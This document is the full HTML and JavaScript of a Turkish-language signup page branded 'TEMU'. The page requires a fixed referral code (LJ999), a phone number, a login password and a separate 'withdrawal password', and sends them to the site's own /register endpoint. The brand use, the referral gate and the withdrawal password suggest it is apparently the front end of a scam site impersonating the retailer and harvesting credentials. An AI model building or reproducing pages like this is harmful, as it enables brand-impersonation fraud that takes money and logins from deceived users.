<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kayıt Ol</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: #f5f5f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .app-container { background-color: white; width: 100%; max-width: 400px; height: 100vh; padding: 20px; position: relative; box-shadow: 0 0 20px rgba(0,0,0,0.1); }
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; color: #333; }
        .header i { font-size: 1.2rem; cursor: pointer; }
        .header-right { display: flex; align-items: center; gap: 15px; }
        .logo-area { display: flex; flex-direction: column; align-items: center; margin-bottom: 40px; }
        .logo-box { background-color: #fb7701; color: white; width: 80px; height: 80px; display: flex; justify-content: center; align-items: center; border-radius: 12px; font-weight: bold; font-size: 1.2rem; margin-bottom: 10px; }
        .app-name { font-weight: bold; font-size: 1.5rem; color: #000; }
        .form-group { margin-bottom: 15px; position: relative; }
        .form-input { width: 100%; padding: 15px; background-color: #f2f2f2; border: none; border-radius: 8px; font-size: 14px; outline: none; color: #333; }
        .form-input:focus { background-color: #e6e6e6; }
        .password-toggle { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); color: #999; cursor: pointer; }
        .submit-btn { width: 100%; padding: 15px; background-color: #ffcea0; color: #d35400; border: none; border-radius: 25px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 20px; transition: 0.3s; }
        .submit-btn:hover { background-color: #fb7701; color: white; }
        .login-link { text-align: center; margin-top: 20px; color: #333; font-size: 14px; font-weight: 500; cursor: pointer; text-decoration: none; display: block; }
        #message-box { text-align: center; margin-top: 10px; font-size: 14px; height: 20px; }
    </style>
</head>
<body>

    <div class="app-container">
        <div class="header">
            <i class="fa-solid fa-arrow-left" onclick="window.history.back()"></i>
            <div class="header-right">
                <i class="fa-solid fa-flag" style="color: red;"></i> <i class="fa-solid fa-circle-user" style="color: #666;"></i>
            </div>
        </div>

        <div class="logo-area">
            <div class="logo-box">TEMU</div>
            <div class="app-name">TEMU</div>
        </div>

        <form id="registerForm">
            <div class="form-group">
                <input type="text" id="refCode" class="form-input" placeholder="Referans Kodu (LJ999)">
            </div>

            <div class="form-group">
                <input type="tel" id="phone" class="form-input" placeholder="Telefon numarası">
            </div>

            <div class="form-group">
                <input type="password" id="password" class="form-input" placeholder="Şifre">
                <i class="fa-regular fa-eye password-toggle" onclick="togglePassword('password')"></i>
            </div>

            <div class="form-group">
                <input type="password" id="confirmPassword" class="form-input" placeholder="Şifreyi Onayla">
                <i class="fa-regular fa-eye password-toggle" onclick="togglePassword('confirmPassword')"></i>
            </div>
            
            <div class="form-group">
                <input type="password" id="withdrawPassword" class="form-input" placeholder="Para çekme şifresi">
                <i class="fa-regular fa-eye password-toggle" onclick="togglePassword('withdrawPassword')"></i>
            </div>

            <button type="button" class="submit-btn" onclick="registerUser()">Göndermek</button>
            
            <div id="message-box"></div>

            <a href="login.html" class="login-link">Giriş yapmak</a>
        </form>
    </div>

    <script>
        const DOGRU_REFERANS_KODU = "LJ999"; 

        async function registerUser() {
            const refInput = document.getElementById('refCode').value.trim();
            const phoneInput = document.getElementById('phone').value.trim();
            const passInput = document.getElementById('password').value;
            const confirmInput = document.getElementById('confirmPassword').value;
            const withdrawInput = document.getElementById('withdrawPassword').value;
            const msgBox = document.getElementById('message-box');

            msgBox.style.color = "red";

            // Validasyonlar
            if (refInput !== DOGRU_REFERANS_KODU) {
                msgBox.innerText = "Hata: Geçersiz Referans Kodu!";
                return;
            }
            if (phoneInput === "" || passInput === "" || withdrawInput === "") {
                msgBox.innerText = "Lütfen tüm alanları doldurun.";
                return;
            }
            if (passInput !== confirmInput) {
                msgBox.innerText = "Hata: Şifreler uyuşmuyor!";
                return;
            }

            // --- SUNUCUYA (SERVER.JS) VERİ GÖNDERME ---
            try {
                const response = await fetch('/register', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        phone: phoneInput,
                        password: passInput,
                        withdrawPassword: withdrawInput,
                        refCode: refInput
                    })
                });

                const data = await response.json();

                if (data.success) {
                    msgBox.style.color = "green";
                    msgBox.innerText = "Kayıt Başarılı! Yönlendiriliyorsunuz...";
                    
                    // LocalStorage'ı da temizleyelim ki eski verilerle karışmasın
                    localStorage.setItem('currentUserPhone', phoneInput);
                    
                    setTimeout(() => {
                        window.location.href = "login.html";
                    }, 1500);
                } else {
                    msgBox.innerText = "Hata: " + data.message;
                }
            } catch (error) {
                msgBox.innerText = "Sunucuya bağlanılamadı!";
                console.error("Hata:", error);
            }
        }

        function togglePassword(inputId) {
            const input = document.getElementById(inputId);
            input.type = input.type === "password" ? "text" : "password";
        }
    </script>
</body>
</html>